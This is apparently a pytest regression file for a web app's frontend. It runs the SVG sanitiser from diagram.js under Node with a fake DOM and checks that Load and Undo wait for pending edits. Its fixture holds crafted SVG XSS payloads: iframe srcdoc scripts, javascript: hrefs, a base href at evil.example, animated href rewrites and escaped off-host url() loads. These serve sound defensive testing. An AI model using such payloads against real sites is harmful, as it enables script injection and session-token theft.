"""Frontend regressions from the 2026-10 review of the frontend core.

Covers the editor shell, tree, details panel, dialogs, diagram and API client
(static/js/main.js, tree.js, details.js, dialogs.js, diagram.js). Each check
pins one verified bug, following test_frontend_b2b.py / test_frontend_dbg2.py:
pure JS is extracted from the module source and executed under Node when it is
on PATH; DOM wiring is pinned at source level.
"""
import json
import re
import shutil
import subprocess
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[2]
STATIC = REPO / "fta_web" / "static" / "js"

needs_node = pytest.mark.skipif(shutil.which("node") is None, reason="node is not installed")


def _read(path: Path) -> str:
    return path.read_text(encoding="utf-8")


def _node(script: str):
    out = subprocess.run(["node", "-e", script], capture_output=True, text=True, check=True).stdout
    return json.loads(out)


def _braced(src: str, start: int) -> str:
    """Source from `start` to the brace that closes the first `{` after it."""
    depth = 0
    for i in range(src.index("{", start), len(src)):
        if src[i] == "{":
            depth += 1
        elif src[i] == "}":
            depth -= 1
            if depth == 0:
                return src[start : i + 1]
    raise AssertionError("unbalanced braces")


# ---- diagram.js: the SVG sanitiser holds on its own ----------------------------------
#
# Fed straight to sanitizeSvg(), a crafted SVG ran script in the app origin
# (an XHTML <iframe srcdoc> / <iframe src="javascript:">, also inside a
# lower-case <foreignobject>), re-pointed every relative fetch -- the API
# calls carrying the session token -- at another host (<base href="http://">),
# turned a vetted <a> into a javascript: link (<set attributeName="href">),
# and loaded from off the box (<style>@import</style>, <image href="http://">,
# style/fill url()). Reproduced in Chromium with DOMParser + importNode exactly
# as render() does; the shim below stands in for the DOM so the real function
# runs under Node.

_SVG_DOM_SHIM = r"""
const NS = {
  svg: 'http://www.w3.org/2000/svg',
  xhtml: 'http://www.w3.org/1999/xhtml',
  xlink: 'http://www.w3.org/1999/xlink',
};
class FakeAttr {
  constructor(qname, value, ns) {
    const colon = qname.indexOf(':');
    this.name = qname;
    this.localName = colon === -1 ? qname : qname.slice(colon + 1);
    this.namespaceURI = ns || null;
    this.value = value;
  }
}
const FAKE_DOC = {
  createTreeWalker(root) {
    const list = [];
    const walk = (n) => { for (const c of n.children) { list.push(c); walk(c); } };
    walk(root);
    let i = -1;
    return {
      get currentNode() { return list[i]; },
      nextNode() { i += 1; return i < list.length ? list[i] : null; },
    };
  },
};
class FakeElement {
  constructor(ns, qname, attrs, kids) {
    const colon = qname.indexOf(':');
    this.namespaceURI = ns;
    this.nodeName = qname;
    this.localName = colon === -1 ? qname : qname.slice(colon + 1);
    this.attributes = (attrs || []).map((a) => new FakeAttr(a[0], a[1], a[2]));
    this.children = [];
    this.parentNode = null;
    this.ownerDocument = FAKE_DOC;
    for (const kid of kids || []) { kid.parentNode = this; this.children.push(kid); }
  }
  removeAttributeNode(attr) { this.attributes = this.attributes.filter((a) => a !== attr); return attr; }
  remove() {
    const p = this.parentNode;
    if (p) p.children = p.children.filter((c) => c !== this);
    this.parentNode = null;
  }
  // Type selectors only, matched case-sensitively as in an XML document.
  querySelectorAll(selector) {
    const names = selector.split(',').map((s) => s.trim());
    const out = [];
    const walk = (n) => { for (const c of n.children) { if (names.indexOf(c.localName) !== -1) out.push(c); walk(c); } };
    walk(this);
    return out;
  }
}
globalThis.NodeFilter = { SHOW_ELEMENT: 1 };
const h = (ns, qname, attrs, kids) => new FakeElement(NS[ns], qname, attrs, kids);
const dump = (n) => [
  (n.namespaceURI === NS.svg ? '' : n.namespaceURI + ' ') + n.localName,
  Object.fromEntries(n.attributes.map((a) => [a.name, a.value])),
  n.children.map(dump),
];
"""

_SVG_CASES = r"""
const attack = h('svg', 'svg', [['onload', 'x()']], [
  h('xhtml', 'iframe', [['srcdoc', '<script>parent.pwned=1</script>']]),
  h('xhtml', 'iframe', [['src', 'javascript:parent.pwned=1']]),
  h('xhtml', 'base', [['href', 'http://evil.example/']]),
  h('xhtml', 'link', [['rel', 'stylesheet'], ['href', 'http://evil.example/x.css']]),
  h('svg', 'foreignobject', [], [h('xhtml', 'iframe', [['srcdoc', '<script>parent.pwned=1</script>']])]),
  h('svg', 'foreignObject', [], [h('xhtml', 'div', [])]),
  h('svg', 'script', [], []),
  h('svg', 'style', [], []),
  h('svg', 'a', [['id', 'link']], [
    h('svg', 'set', [['attributeName', 'href'], ['to', 'javascript:pwn()']]),
    h('svg', 'animate', [['attributeName', 'xlink:href'], ['values', 'javascript:pwn()']]),
    h('svg', 'text', [['x', '1']], []),
  ]),
  h('svg', 'rect', [
    ['id', 'box'],
    ['onclick', 'pwn()'],
    ['style', "background-image:image-set('http://evil.example/a.png' 1x)"],
    ['fill', 'u\\72 l(http://evil.example/f.svg#g)'],
    ['stroke', 'url( "http://evil.example/s.svg#g" )'],
  ]),
  h('svg', 'image', [['href', 'http://evil.example/i.png'], ['xlink:href', ' javascript:pwn()', NS.xlink]]),
  h('svg', 'use', [['href', 'data:image/svg+xml,<svg/>#a']]),
]);
const legit = h('svg', 'svg', [['width', '62pt'], ['viewBox', '0 0 62 44']], [
  h('svg', 'defs', [], [h('svg', 'linearGradient', [['id', 'l_0']], [h('svg', 'stop', [['offset', '0']])])]),
  h('svg', 'g', [['id', 'graph0'], ['class', 'graph'], ['transform', 'scale(1 1)']], [
    h('svg', 'title', [], []),
    h('svg', 'polygon', [['fill', 'url(#l_0)'], ['stroke', 'black'], ['points', '0,0 1,1']]),
    h('svg', 'g', [['id', 'node1'], ['class', 'node']], [
      h('svg', 'a', [['xlink:href', '#node1', NS.xlink]], [h('svg', 'text', [['x', '8'], ['font-family', 'Meiryo']], [])]),
      h('svg', 'use', [['href', ' #l_0']]),
    ]),
  ]),
]);
const before = JSON.stringify(dump(legit));
sanitizeSvg(attack);
sanitizeSvg(legit);
let rejectsHtmlRoot = false;
try {
  sanitizeSvg(h('xhtml', 'html', [], [h('xhtml', 'iframe', [['srcdoc', '<script>parent.pwned=1</script>']])]));
} catch (_err) {
  rejectsHtmlRoot = true;
}
console.log(JSON.stringify({ attack: dump(attack), legitUnchanged: JSON.stringify(dump(legit)) === before, rejectsHtmlRoot }));
"""


def _sanitizer_source() -> str:
    """sanitizeSvg plus the constants and helpers it uses, from diagram.js."""
    src = _read(STATIC / "diagram.js")
    parts = [
        m.group(0)
        for m in re.finditer(r"^const (?:SVG_NS|UNSAFE_SVG_ELEMENTS|SAFE_HREF) = .*?;$", src, re.M | re.S)
    ]
    for name in ("cssUnescape", "hasForeignUrl"):
        at = src.find("function %s(" % name)
        if at != -1:
            parts.append(_braced(src, at))
    parts.append(_braced(src, src.index("function sanitizeSvg(root)")))
    return "\n".join(parts)


@needs_node
def test_svg_sanitiser_strips_script_navigation_and_off_box_loads():
    got = _node(_SVG_DOM_SHIM + _sanitizer_source() + _SVG_CASES)
    tag, attrs, kids = got["attack"]
    assert tag == "svg" and attrs == {}, "the root's onload must go"
    # Nothing outside the SVG namespace, nothing that runs script or rewrites
    # an href: only the <a> (with its text), the rect, the image and the use.
    assert [k[0] for k in kids] == ["a", "rect", "image", "use"], kids
    link, rect, image, use = kids
    assert link == ["a", {"id": "link"}, [["text", {"x": "1"}, []]]]
    assert rect == ["rect", {"id": "box"}, []], "event handler, style and off-box url() attributes"
    assert image == ["image", {}, []], "no remote or javascript: href"
    assert use == ["use", {}, []], "no data: href"
    assert got["legitUnchanged"], "Graphviz output and same-document references must survive"
    assert got["rejectsHtmlRoot"], "a document whose root is not SVG is refused, not imported"


def test_sanitiser_runs_before_the_svg_is_imported():
    src = _read(STATIC / "diagram.js")
    body = _braced(src, src.index("async function render()"))
    assert body.index("sanitizeSvg(parsed);") < body.index("document.importNode(parsed, true)")


# ---- main.js: Load and Undo/Redo wait for the edit their click started ----------------
#
# A click on Load or Undo blurs the field being typed in (details, title, inline
# rename), which starts its commit. Load checked `dirty` before that commit
# landed, so with a quick click (a touchpad tap) the "Discard the unsaved
# changes?" question was skipped every time and the typing was lost to the file
# opened. Undo raced the commit on the server: when /undo won, the typing was
# applied on top and wiped the redo step of the edit Undo had just reverted.
# Both reproduced in Chromium against the running app.


def test_load_waits_for_pending_commits_before_checking_dirty():
    src = _read(STATIC / "main.js")
    body = _braced(src, src.index("async function actionLoad()"))
    assert "await flushPendingEdits();" in body
    assert body.index("await flushPendingEdits();") < body.index("store.state.dirty")
    assert body.index("await flushPendingEdits();") < body.index("pickPath('open')")

